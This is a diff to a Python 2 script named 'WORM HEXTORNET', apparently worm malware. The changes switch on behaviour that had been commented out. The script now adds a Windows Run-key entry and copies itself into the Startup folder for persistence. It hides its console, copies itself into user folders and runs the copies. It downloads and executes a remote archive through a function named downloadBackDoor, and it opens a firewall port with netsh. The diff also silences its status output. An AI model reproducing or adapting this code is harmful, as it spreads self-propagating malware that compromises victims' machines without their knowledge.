@@ -1,7 +1,10 @@
 #!/usr/bin/env python
 
-#import win32con, win32api, win32console, win32gui
-#from _winreg import *
+import win32con
+import win32api
+import win32console
+import win32gui
+from _winreg import *
 from shutil import copyfile
 import os, getpass
 import os, random, sys, pkg_resources
@@ -10,28 +13,21 @@ import subprocess
 import shutil
 from time import sleep
 
-
-print(
-"""
-[==========================]
-+                          +
-+     WORM HEXTORNET       +
-+                          +
-[==========================]
-"""
-)
-
 code = """#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-#import win32con, win32api, win32console, win32gui
-#from _winreg import *
+import win32con
+import win32api
+import win32console
+import win32gui
+from _winreg import *
 from shutil import copyfile
 import os, getpass
 import os, random, sys, pkg_resources
 from urllib2 import urlopen
 import subprocess
 import shutil
+from time import sleep
 
 URL = 'https://github.com/hectormtc/hextornet/archive/master.zip'
 src = ''
@@ -44,38 +40,38 @@ hexDir = zip(directories, hextornet)
 dst = ''
 
 def windows_client(system = sys.platform):
-	if system.startswith('win'):
+        if system.startswith('win'):
             return True
         else:
             return False
 
 
 def linux_client(system = sys.platform):
-	if system.startswith('linux'):
-	        return True
-    	else:
-        	return False
+        if system.startswith('linux'):
+                return True
+        else:
+                return False
 
 def verification(source, worm, dst):
-	code = dst + worm
-	if source == code:
-		source = os.path.abspath(dst + worm)
-		print'\t[SOURCE WORM]', source
-		downloadBackDoor(URL, dst)
-	else:
-		pass
-	
+        code = dst + worm
+        if source == code:
+                source = os.path.abspath(dst + worm)
+                print'\t[SOURCE WORM]', source
+                downloadBackDoor(URL, dst)
+        else:
+                pass
+        
 
 def validate():
-	for d, w in hexDir:
-		linux = '/' + usr + '/' + d + '/'
-		windows = "C:/Users" + "/" + usr + "/" + d + "/"
-		if linux_client():
-			verification(src1, w, linux)
-		elif windows_client():
-			verification(src1, w, windows)
-		else:
-			print'Not Found [SRC]'
+        for d, w in hexDir:
+                linux = '/' + usr + '/' + d + '/'
+                windows = "C:/Users" + "/" + usr + "/" + d + "/"
+                if linux_client():
+                        verification(src1, w, linux)
+                elif windows_client():
+                        verification(src1, w, windows)
+                else:
+                        print'Not Found [SRC]'
 
 def hide():
         window = win32console.GetConsoleWindow()
@@ -84,8 +80,8 @@ def hide():
 
 
 def addStartup():
-	fp = os.path.dirname(os.path.realpath(__file__))
-	file_name = sys.argv[0].split("''")[-1]
+        fp = os.path.dirname(os.path.realpath(__file__))
+        file_name = sys.argv[0].split("''")[-1]
         new_file_path = fp + "''" + file_name
         keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
         key2change= OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
@@ -93,34 +89,34 @@ def addStartup():
 
 
 def downloadBackDoor(url, path):
-        print'	[START DOWNLOAD]',src
+        print'  [START DOWNLOAD]',src
         filename = url.split('/')[-1].split('#')[0].split('?')[0]
         content = urlopen(url).read()
         outfile = open(filename, "wb")
         outfile.write(content)
         outfile.close()
-	source= os.path.abspath(filename)
-	shutil.move(source, path)
-	print'\t[DOWNLOAD IN]',os.path.abspath(filename)
+        source= os.path.abspath(filename)
+        shutil.move(source, path)
+        print'\t[DOWNLOAD IN]',os.path.abspath(filename)
         run(os.path.abspath(filename))
         print'\t[DOWNLOAD DONE]', src
 
 
 def run(program):
-        print'	[RUNNING WORM]',program
+        print'  [RUNNING WORM]',program
         process = subprocess.Popen(program, shell=True)
         process.wait()
 
 
 def main():
-	validate()
+        validate()
         #hide()
         #addStartup()
         #hide()
         #downloadBackDoor('https://github.com/hectormtc/hextornet/archive/master.zip')
 
 if __name__ == "__main__":
-	main()
+        main()
 """
 
 
@@ -146,10 +142,14 @@ def addStartup():
     file_name = sys.argv[0].split("\\")[-1]
     new_file_path = fp + "\\" + file_name
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
-
     key2change= OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
 
-    SetValueEx(key2change, "Process", 0, REG_SZ, new_file_path)
+    SetValueEx(key2change, "WinProcess", 0, REG_SZ, new_file_path)
+    path = 'C:\\Users\\' +usr+"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+    os.system('copy hextornet.py path')
+    #shutil.move(src, path)
+
+addStartup()
 
 
 def windows_client(system = sys.platform):
@@ -167,7 +167,7 @@ def linux_client(system = sys.platform):
 
 def copyHex(hexworm, src, dst):
         copyfile(src, dst)
-        print'[PROPAGATE]', dst
+        #print'[PROPAGATE]', dst
         hextornet.remove(hexworm)
 
 def duplicate(hexfile):
@@ -176,63 +176,54 @@ def duplicate(hexfile):
         filename.close()
 
 def propagate():
-        print("[===============Worm location==========]")
+        #print("[===============Worm location==========]")
         for d, w in hexDir:
                 if linux_client():
                         dst = '/' + usr + '/' + d + '/' + str(w) + '.py'
                 elif windows_client():
                         dst = "C:/Users" + "/" + usr + "/" + d + "/" + str(w) + '.py'
-		localization.append(dst)
+                localization.append(dst)
                 copyHex(w, src, dst)
                 duplicate(dst)
-        print("[======================================]")
-
-def hide():
-        for fname in os.listdir('.'):
-                if fname.find('.py') == len(fname) - len('.py'):
-                        #make the file hidden
-                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_HIDDEN)
-                elif fname.find('.txt') == len(fname) - len('.txt'):
-                        #make the file read only
-                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_READONLY)
-                else:
-                        #to force deletion of a file set it to normal
-                        win32api.SetFileAttributes(fname, win32con.FILE_ATTRIBUTE_NORMAL)
-                        os.remove(fname)
+        #print("[======================================]")
 
 
 def downloadBackDoor(url):
-        print'===========1Start downloading=========='
+        #print'===========1Start downloading=========='
         filename = url.split('/')[-1].split('#')[0].split('?')[0]
-        print"...Reading file"
+        #print"...Reading file"
         content = urlopen(url).read()
         outfile = open(filename, "wb")
         outfile.write(content)
-        print'...Writing file'
+        #print'...Writing file'
         outfile.close()
         run(os.path.abspath(filename))
-        print'==========1finish downloading=========='
+        #print'==========1finish downloading=========='
 
 def runWorms():
-	for worm in range(0, len(localization)):
-		run(localization[worm])
+        for worm in range(0, len(localization)):
+                run(localization[worm])
 
 def run(program):
-        print'[RUN HEXTORNET]',program
+        #print'[RUN HEXTORNET]',program
         try:
-                process = subprocess.Popen('python ' + program, shell=True)
+                process = subprocess.Popen(program, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                 process.wait()
         except Exception as e:
                 return '[!]'+str(e)
+def openPort(port):
+        os.system('netsh firewall add portopening protocol = TCP port = '+port+' name = "TCP/IP" mode = ENABLE scope = SUBNET')
 
 def main():
-        #hide()
-        #addStartup()
-        propagate()
-	runWorms()
-        #hide()
-        #downloadBackDoor("https://cdn.fbsbx.com/v/t59.2708-21/24297685_1903721959657007_3729764176965402624_n.py/registro.py?_nc_cat=103&oh=94924732aeb080d40407392e177da87d&oe=5BAB8629&dl=1")
-
-
+        if windows_client():
+                hide()
+                addStartup()
+                propagate()
+                runWorms()
+                downloadBackDoor("https://github.com/hectormtc/hextornet/archive/master.zip")
+        elif linux_client():
+                propagate()
+                runWorms()
+                downloadBackDoor("https://github.com/hectormtc/hextornet/archive/master.zip")
 if __name__ == "__main__":
-	main()
+        main()
